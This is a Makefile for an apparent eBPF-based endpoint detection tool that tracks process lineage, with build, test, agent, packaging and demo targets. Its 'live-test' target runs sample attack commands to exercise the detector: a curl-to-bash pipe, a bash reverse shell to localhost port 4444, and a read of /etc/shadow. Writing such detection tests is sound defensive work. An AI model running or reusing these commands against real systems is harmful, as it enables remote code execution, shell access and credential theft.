# Project SENTINEL — Makefile

VERSION := $(shell cat VERSION 2>/dev/null || echo 0.0.0)
PKG_NAME := sentinel-lineage-edr-$(VERSION)

# Legacy build (needs kernel headers matching running kernel)
BPF_SRC_LEGACY := ebpf/sentinel_lineage.bpf.c
BPF_OBJ_LEGACY := build/sentinel_lineage.o

# CO-RE build (Compile Once, Run Everywhere — uses vmlinux.h + BTF)
BPF_SRC_CORE := ebpf/sentinel_lineage_core.bpf.c
BPF_OBJ_CORE := build/sentinel_lineage_core.o

CLANG := clang
LLC := llc

# Legacy flags (kernel headers required)
BPF_CFLAGS_LEGACY := -target bpf -D__TARGET_ARCH_x86 -I/usr/include -I/usr/include/bpf -Wall -O2 -g

# Directory holding libbpf's bpf_helpers.h (the "bpf" dir). Override with e.g.
#   make build-core BPF_INC=/path/to/include/bpf
BPF_INC := $(firstword $(wildcard /usr/include/bpf /usr/local/include/bpf \
  /usr/include/$(shell uname -m)-linux-gnu/bpf))
# The include ROOT is its parent, so that <bpf/bpf_helpers.h> resolves.
BPF_INC_ROOT := $(patsubst %/bpf,%,$(BPF_INC))

# CO-RE flags (no kernel headers needed — uses vmlinux.h + libbpf helpers)
BPF_CFLAGS_CORE := -target bpf -D__TARGET_ARCH_x86 -I./ebpf \
  $(if $(BPF_INC_ROOT),-I$(BPF_INC_ROOT),) -Wall -O2 -g

.PHONY: all build build-legacy build-core verify test run-hub run-agent simulate live-test demo install-deps setup-kernel package clean help

all: build-core test

## build — compile CO-RE eBPF program (works on any kernel with BTF)
build: build-core

## build-legacy — compile legacy eBPF program (needs matching kernel headers)
build-legacy: $(BPF_OBJ_LEGACY)

## build-core — compile CO-RE eBPF program (recommended)
build-core: check-bpf-hdrs $(BPF_OBJ_CORE)

$(BPF_OBJ_LEGACY): $(BPF_SRC_LEGACY)
	@mkdir -p build
	@echo "[*] Compiling legacy eBPF program (needs kernel headers)..."
	$(CLANG) $(BPF_CFLAGS_LEGACY) -c $(BPF_SRC_LEGACY) -o $@
	@echo "[✓] Built $@"

$(BPF_OBJ_CORE): $(BPF_SRC_CORE)
	@mkdir -p build
	@echo "[*] Compiling CO-RE eBPF program (uses vmlinux.h)..."
	$(CLANG) $(BPF_CFLAGS_CORE) -c $(BPF_SRC_CORE) -o $@
	@echo "[✓] Built $@"

## verify — syntax-check the CO-RE eBPF source
verify: check-bpf-hdrs
	$(CLANG) $(BPF_CFLAGS_CORE) -fsyntax-only $(BPF_SRC_CORE)
	@echo "[✓] CO-RE eBPF syntax OK"

## check-bpf-hdrs — fail early with an actionable message if libbpf headers are absent
.PHONY: check-bpf-hdrs
check-bpf-hdrs:
	@if [ ! -f "$(BPF_INC)/bpf_helpers.h" ]; then \
	  echo "error: libbpf development headers not found (looked for <include>/bpf/bpf_helpers.h)."; \
	  echo "       Debian/Ubuntu: sudo apt-get install -y libbpf-dev clang llvm"; \
	  echo "       Fedora/RHEL:   sudo dnf install -y libbpf-devel clang llvm"; \
	  echo "       Arch:          sudo pacman -S --needed libbpf clang llvm"; \
	  echo "       Other:         make build-core BPF_INC=/path/to/include/bpf"; \
	  exit 1; \
	fi

## test — run the Python test suites (lineage, auth, state backend, rules)
test:
	python3 tests/test_lineage.py
	python3 tests/test_auth_db.py
	python3 tests/test_state_backend.py
	python3 tests/test_rule_matching.py
	python3 tests/test_agent_sync.py

## run-hub — run the collector + dashboard in the foreground
run-hub:
	python3 collector/sentinel_hub_lineage.py

## run-agent — run the eBPF agent (root, real kernel required)
run-agent:
	sudo python3 agent/sentinel_lineage_agent.py

## simulate — ship synthetic threat events to a running hub
simulate:
	python3 tools/simulate_attacks.py 200

## live-test — trigger real attack patterns against the live agent
live-test:
	@echo "[*] Running live attack simulation..."
	@echo "  Test 1: Benign process"
	/bin/ls -la /
	@echo "  Test 2: Pipe execute pattern"
	timeout 2 bash -c 'curl -s http://httpbin.org/get | bash' 2>/dev/null || true
	@echo "  Test 3: Reverse shell pattern"
	timeout 2 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' 2>/dev/null || true
	@echo "  Test 4: Shadow access (needs sudo)"
	sudo timeout 2 cat /etc/shadow 2>/dev/null || true
	@echo "[✓] Live test complete"

## install-deps — distro packages for building/running everything
install-deps:
	@set -e; \
	if command -v apt-get >/dev/null; then \
	  sudo apt-get install -y python3 python3-venv python3-pip clang llvm libbpf-dev \
	    linux-headers-$$(uname -r) bpfcc-tools python3-bcc; \
	elif command -v dnf >/dev/null; then \
	  sudo dnf install -y python3 python3-pip clang llvm bcc-tools python3-bcc kernel-headers kernel-devel; \
	elif command -v pacman >/dev/null; then \
	  sudo pacman -Sy --needed python python-pip clang llvm bcc python-bcc linux-headers; \
	else echo "Unsupported distro — install clang, llvm, bcc, kernel headers manually."; fi

## setup-kernel — load BPF infrastructure
setup-kernel:
	sudo modprobe bpf
	sudo mount -t debugfs none /sys/kernel/debug 2>/dev/null || true
	sudo mount -t tracefs none /sys/kernel/tracing 2>/dev/null || true
	@echo "[✓] Kernel ready"

## package — release tarball in dist/
package:
	@mkdir -p dist
	tar czf dist/$(PKG_NAME).tar.gz \
	  --exclude='.venv' --exclude='build' --exclude='dist' --exclude='__pycache__' \
	  --exclude='*.pyc' --exclude='lineage_db.json' --exclude='sentinel.db' --exclude='*.db' --exclude='.git' \
	  --exclude='.env' \
	  --transform 's,^\.,$(PKG_NAME),' .
	@echo "[✓] dist/$(PKG_NAME).tar.gz"

## demo — run the live attack demo (localhost-only, on the sensor box)
demo:
	sudo ./demo/attack.sh

## clean — remove build artifacts
clean:
	rm -rf build dist
	@echo "[✓] Cleaned"

## help — list targets
help:
	@grep -E '^## ' $(MAKEFILE_LIST) | sed 's/## /  /'
